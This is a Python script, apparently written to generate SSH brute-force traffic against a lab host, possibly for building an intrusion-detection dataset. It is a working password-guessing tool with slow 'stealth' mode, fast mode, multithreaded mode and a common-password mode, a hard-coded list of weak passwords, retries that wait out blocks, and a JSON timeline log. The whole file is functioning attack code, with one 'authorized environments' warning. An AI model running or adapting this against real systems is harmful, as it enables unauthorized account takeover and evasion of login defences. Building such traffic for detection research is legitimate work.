# ssh_patator.py
import paramiko
import threading
import time
import random
import json
from datetime import datetime

# ======== CONFIG ========
TARGET_IP = "192.168.17.192"
TARGET_PORT = 22
USERNAME = "workstation"
WORDLIST_PATH = "/usr/share/wordlists/rockyou.txt"
LOG_FILE = "ssh_patator_timeline.json"

class SSHPatatorGenerator:
    """SSH Brute Force Attack Generator"""
    
    def __init__(self, target_ip, target_port, username):
        self.target_ip = target_ip
        self.target_port = target_port
        self.username = username
        self.attacks = []
        self.attempts = 0
        self.blocks = 0
        self.stop_attack = False
        self.success = False
        self.found_password = None
    
    def log_attack_start(self, attack_type, description):
        """تسجيل بداية الهجوم"""
        self.current_attack = {
            "attack_type": attack_type,
            "description": description,
            "target_ip": self.target_ip,
            "target_port": self.target_port,
            "username": self.username,
            "start_time": datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f'),
            "start_timestamp": time.time(),
        }
        print(f"\n{'='*60}")
        print(f"[+] Attack: {attack_type}")
        print(f"[+] Target: {self.target_ip}:{self.target_port}")
        print(f"[+] Username: {self.username}")
        print(f"[+] Start: {self.current_attack['start_time']}")
        print(f"{'='*60}\n")
        
        self.stop_attack = False
        self.attempts = 0
        self.blocks = 0
    
    def log_attack_end(self):
        """تسجيل نهاية الهجوم"""
        self.stop_attack = True
        
        self.current_attack['end_time'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')
        self.current_attack['end_timestamp'] = time.time()
        self.current_attack['duration_seconds'] = round(
            self.current_attack['end_timestamp'] - self.current_attack['start_timestamp'], 2
        )
        self.current_attack['attempts'] = self.attempts
        self.current_attack['blocks'] = self.blocks
        self.current_attack['success'] = self.success
        self.current_attack['found_password'] = self.found_password
        
        print(f"\n[✓] Attack completed")
        print(f"[✓] Duration: {self.current_attack['duration_seconds']}s")
        print(f"[✓] Attempts: {self.attempts}")
        print(f"[✓] Blocks: {self.blocks}")
        if self.success:
            print(f"[✓] Password found: {self.found_password}")
        print()
        
        self.attacks.append(self.current_attack)
    
    def save_timeline(self):
        """حفظ الـ timeline"""
        with open(LOG_FILE, 'w') as f:
            json.dump(self.attacks, f, indent=2)
        print(f"\n[✓] Timeline saved to: {LOG_FILE}")


def load_passwords(wordlist_path, max_passwords=None):
    """تحميل كلمات السر"""
    try:
        with open(wordlist_path, 'r', encoding='latin-1', errors='ignore') as f:
            passwords = []
            for i, line in enumerate(f):
                if max_passwords and i >= max_passwords:
                    break
                pwd = line.strip()
                if pwd:
                    passwords.append(pwd)
            return passwords
    except FileNotFoundError:
        print(f"[!] Wordlist not found: {wordlist_path}")
        return []


# ======== 1. Slow SSH Brute Force ========
def ssh_slow_attack(attacker, passwords, delay=5):
    """هجوم بطيء للتهرب"""
    attacker.log_attack_start("SSH_SLOW", "Slow SSH brute force (stealth)")
    
    for password in passwords:
        if attacker.stop_attack:
            break
        
        retries = 0
        while retries < 3:
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                
                client.connect(
                    hostname=attacker.target_ip,
                    port=attacker.target_port,
                    username=attacker.username,
                    password=password,
                    timeout=10,
                    look_for_keys=False,
                    allow_agent=False
                )
                
                print(f"[✓] SUCCESS! Password: {password}")
                attacker.success = True
                attacker.found_password = password
                client.close()
                attacker.log_attack_end()
                return
                
            except paramiko.AuthenticationException:
                print(f"[-] Failed: {password}")
                break
                
            except paramiko.ssh_exception.SSHException as e:
                if "banner" in str(e).lower():
                    attacker.blocks += 1
                    print(f"[!] Blocked! Cooling down 30s...")
                    time.sleep(30)
                    retries += 1
                else:
                    break
                    
            except Exception as e:
                print(f"[!] Error: {e}")
                break
            
            finally:
                try:
                    client.close()
                except:
                    pass
        
        attacker.attempts += 1
        time.sleep(delay)
    
    attacker.log_attack_end()


# ======== 2. Fast SSH Brute Force ========
def ssh_fast_attack(attacker, passwords, delay=0.5):
    """هجوم سريع"""
    attacker.log_attack_start("SSH_FAST", "Fast SSH brute force")
    
    for password in passwords:
        if attacker.stop_attack:
            break
        
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            client.connect(
                hostname=attacker.target_ip,
                port=attacker.target_port,
                username=attacker.username,
                password=password,
                timeout=5,
                look_for_keys=False,
                allow_agent=False
            )
            
            print(f"[✓] SUCCESS! Password: {password}")
            attacker.success = True
            attacker.found_password = password
            client.close()
            break
            
        except paramiko.AuthenticationException:
            if attacker.attempts % 50 == 0:
                print(f"[*] Attempts: {attacker.attempts}")
        except paramiko.ssh_exception.SSHException:
            attacker.blocks += 1
            time.sleep(10)
        except:
            pass
        
        finally:
            try:
                client.close()
            except:
                pass
        
        attacker.attempts += 1
        time.sleep(delay)
    
    attacker.log_attack_end()


# ======== 3. Multi-threaded SSH Attack ========
def ssh_multithread_attack(attacker, passwords, threads=3):
    """هجوم بـ threads متعددة"""
    attacker.log_attack_start("SSH_MULTITHREAD", "Multi-threaded SSH brute force")
    
    password_queue = list(passwords)
    lock = threading.Lock()
    
    def worker():
        while password_queue and not attacker.stop_attack:
            with lock:
                if not password_queue:
                    break
                password = password_queue.pop(0)
            
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                
                client.connect(
                    hostname=attacker.target_ip,
                    port=attacker.target_port,
                    username=attacker.username,
                    password=password,
                    timeout=10,
                    look_for_keys=False,
                    allow_agent=False
                )
                
                print(f"[✓] SUCCESS! Password: {password}")
                attacker.success = True
                attacker.found_password = password
                attacker.stop_attack = True
                client.close()
                break
                
            except paramiko.AuthenticationException:
                pass
            except paramiko.ssh_exception.SSHException:
                with lock:
                    attacker.blocks += 1
                time.sleep(15)
            except:
                pass
            
            finally:
                try:
                    client.close()
                except:
                    pass
            
            with lock:
                attacker.attempts += 1
                if attacker.attempts % 20 == 0:
                    print(f"[*] Attempts: {attacker.attempts}, Blocks: {attacker.blocks}")
            
            time.sleep(random.uniform(2, 5))
    
    thread_list = []
    for _ in range(threads):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        thread_list.append(t)
    
    for t in thread_list:
        t.join()
    
    attacker.log_attack_end()


# ======== 4. Common Passwords Attack ========
def ssh_common_passwords(attacker):
    """محاولة passwords شائعة"""
    attacker.log_attack_start("SSH_COMMON", "Common passwords attack")
    
    common_passwords = [
    'password', '123456', '12345678', 'admin', 'root', 
    'toor', 'pass', 'test', 'password123', 'admin123',
    'root123', 'qwerty', 'letmein', 'welcome', '1234',
    '12345', '123456789', '1234567', '111111', '000000',
    '123123', '654321', 'user', 'guest', 'administrator',
    'sysadmin', 'user123', 'default', 'master', 'secret',
    'sunshine', 'monkey', 'dragon', 'princess', 'iloveyou',
    'qazwsx', 'asdfgh', 'zxcvbn', 'qwertyuiop', 'p@ssword',
    'P@ssword1', 'admin@123', 'admin1234', 'admin12345', '1234567890',
    '1q2w3e4r', 'abc123', 'oracle', 'postgres', 'mysql',
    'server', 'sql', 'system', 'adminpass', 'tomcat',
    'ubuntu', 'kali', 'changeme', 'manager', 'service',
    'support', 'webmaster', '12345678910', '0987654321', '1234560',
    '123123123', '11111111', '222222', '333333', '888888',
    '777777', '999999', '1234qwer', 'qwerasdf', 'zxcvbnm',
    'asdfghjkl', 'poiu', 'asdf', 'fdsa', 'rewq',
    'password1234', 'admin1', 'admin2', 'user1', 'test1',
    'test1234', 'demo', 'demo123', 'unknown', 'god',
    'love', 'baby', 'football', 'baseball', 'hacker',
    'ninja', 'shadow', 'superman', 'batman', 'matrix'
]
    
    for password in common_passwords:
        if attacker.stop_attack:
            break
        
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            client.connect(
                hostname=attacker.target_ip,
                port=attacker.target_port,
                username=attacker.username,
                password=password,
                timeout=10,
                look_for_keys=False,
                allow_agent=False
            )
            
            print(f"[✓] SUCCESS! Common password: {password}")
            attacker.success = True
            attacker.found_password = password
            client.close()
            break
            
        except paramiko.AuthenticationException:
            print(f"[-] Failed: {password}")
        except:
            pass
        
        finally:
            try:
                client.close()
            except:
                pass
        
        attacker.attempts += 1
        time.sleep(3)
    
    attacker.log_attack_end()


# ======== MAIN ========
def main():
    import argparse
    
    parser = argparse.ArgumentParser(description='SSH Patator Attack Generator')
    parser.add_argument('-t', '--target', required=True, help='Target IP')
    parser.add_argument('-p', '--port', type=int, default=22, help='SSH port')
    parser.add_argument('-u', '--username', default='root', help='Username')
    parser.add_argument('-w', '--wordlist', default=WORDLIST_PATH, help='Wordlist path')
    parser.add_argument('-n', '--num-passwords', type=int, default=200, 
                       help='Number of passwords to try')
    parser.add_argument('-a', '--attack',
                       choices=['slow', 'fast', 'multithread', 'common', 'all'],
                       default='all',
                       help='Attack type')
    
    args = parser.parse_args()
    
    print("\n" + "="*60)
    print("SSH PATATOR ATTACK GENERATOR")
    print("="*60)
    print(f"Target: {args.target}:{args.port}")
    print(f"Username: {args.username}")
    print(f"Attack: {args.attack}")
    print("="*60 + "\n")
    
    print("⚠️  WARNING: Use only in authorized environments!\n")
    
    input("Press ENTER to start...")
    
    attacker = SSHPatatorGenerator(args.target, args.port, args.username)
    
    # تحميل passwords
    print(f"[+] Loading passwords from {args.wordlist}...")
    passwords = load_passwords(args.wordlist, args.num_passwords)
    print(f"[+] Loaded {len(passwords)} passwords\n")
    
    if not passwords and args.attack not in ['common', 'all']:
        print("[!] No passwords loaded. Exiting.")
        return
    
    try:
        if args.attack == 'slow':
            ssh_slow_attack(attacker, passwords)
        elif args.attack == 'fast':
            ssh_fast_attack(attacker, passwords)
        elif args.attack == 'multithread':
            ssh_multithread_attack(attacker, passwords)
        elif args.attack == 'common':
            ssh_common_passwords(attacker)
        elif args.attack == 'all':
            ssh_common_passwords(attacker)
            time.sleep(10)
            ssh_slow_attack(attacker, passwords[:50])
            time.sleep(10)
            ssh_fast_attack(attacker, passwords[50:100])
            time.sleep(10)
            ssh_multithread_attack(attacker, passwords[100:200])
    
    except KeyboardInterrupt:
        print("\n\n[!] Stopped by user")
    
    finally:
        attacker.save_timeline()


if __name__ == "__main__":
    main()
